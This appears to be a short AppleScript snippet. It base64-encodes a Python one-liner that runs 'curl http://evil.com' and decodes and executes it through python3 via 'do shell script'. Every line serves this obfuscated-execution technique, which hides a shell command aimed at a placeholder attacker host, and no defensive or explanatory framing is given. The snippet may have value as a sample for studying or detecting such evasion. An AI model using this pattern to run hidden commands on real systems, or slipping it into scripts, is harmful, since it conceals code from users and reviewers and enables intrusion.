-- Python: import os; os.system("curl http://evil.com")
-- Base64 encoded
set b64 to "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vZXZpbC5jb20iKQ=="
-- Decode and run inside Python from AppleScript
do shell script "python3 -c \"import base64; exec(base64.b64decode('" & b64 & "'))\""
